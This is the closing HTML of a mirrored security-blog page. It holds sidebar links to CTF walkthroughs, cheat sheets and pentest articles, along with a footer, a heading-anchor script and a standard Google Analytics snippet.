<a href="../linux-commands-cheat-sheet/index.html">Linux Commands Cheat Sheet</a>
</li>
<li>
<a href="../cheat-sheet/index.html">More »</a>
</li>
</ul>
<h4>WalkThroughs</h4>
<ul>
<li class="">
<a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
</li>
<li class="">
<a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
</li>
<li class="">
<a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a>
</li>
<li class="">
<a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a>
</li>
<li class="">
<a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a>
</li>
<li>
<a href="../walkthroughs/index.html">More »</a>
</li>
</ul>
<h4>Techniques</h4>
<ul>
<li class="">
<a href="../ssh-meterpreter-pivoting-techniques/index.html">SSH & Meterpreter Pivoting Techniques</a>
</li>
<li>
<a href="../techniques/index.html">More »</a>
</li>
</ul>
<h4>Security Hardening</h4>
<ul>
<li class="">
<a href="../security-harden-centos-7/index.html">Security Harden CentOS 7</a>
</li>
<li>
<a href="../security-hardening/index.html">More »</a>
</li>
</ul>
<h4>/dev/urandom</h4>
<ul>
<li class="">
<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
</li>
<li>
<a href="../urandom/index.html">More »</a>
</li>
</ul>
<h4>Other Blog</h4>
<ul>

<li class="">
<a href="../insecure-direct-object-reference-idor/index.html">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</a>
</li>
<li class="">
<a href="../encrypted-note-taking-solution/index.html">Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</a>
</li>
<li class="">
<a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
</li>
<li class="">
<a href="../jenkins-api-unauthenticated-rce-exploit/index.html">Jenkins RCE via Unauthenticated API</a>
</li>
<li class="">
<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
</li>
<li class="">
<a href="../enum4linux-cheat-sheet/index.html">enum4linux Cheat Sheet</a>
</li>
<li class="">
<a href="../linux-local-enumeration-script/index.html">Linux Local Enumeration Script</a>
</li>
<li class="">
<a href="../howto-install-quassel-ubuntu/index.html">HowTo Install Quassel on Ubuntu</a>
</li>
<li class="">
<a href="../keepnote-macbook-install-instructions/index.html">HowTo Install KeepNote on OSX Mavericks</a>
</li>
</ul>
</aside>
</div>
<div class="clear"></div>
</div>
</section>
<footer>
<div class="grid">
<div class="unit one-third center-on-mobiles">
<p>The contents of this website are &copy;&nbsp;2022 <a href="../../index.html">HighOn.Coffee</a></p>
</div>
<div class="unit two-thirds align-right center-on-mobiles">
<p>
Proudly hosted by
<img src="../../img/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
</a>
</p>
</div>
</div>
</footer>
<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
  var anchorForId = function (id) {
    var anchor = document.createElement("a");
    anchor.className = "header-link";
    anchor.href      = "#" + id;
    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
    return anchor;
  };

  var linkifyAnchors = function (level, containingElement) {
    var headers = containingElement.getElementsByTagName("h" + level);
    for (var h = 0; h < headers.length; h++) {
      var header = headers[h];

      if (typeof header.id !== "undefined" && header.id !== "") {
        header.appendChild(anchorForId(header.id));
      }
    }
  };

  document.onreadystatechange = function () {
    if (this.readyState === "complete") {
      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
      if (!contentBlock) {
        return;
      }
      for (var level = 1; level <= 6; level++) {
        linkifyAnchors(level, contentBlock);
      }
    }
  };
</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-55017594-1', 'auto');
  ga('send', 'pageview');

</script>
</body>

<!-- Mirrored from highon.coffee/blog/pipe-ctf-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Dec 2022 15:33:47 GMT -->
</html>
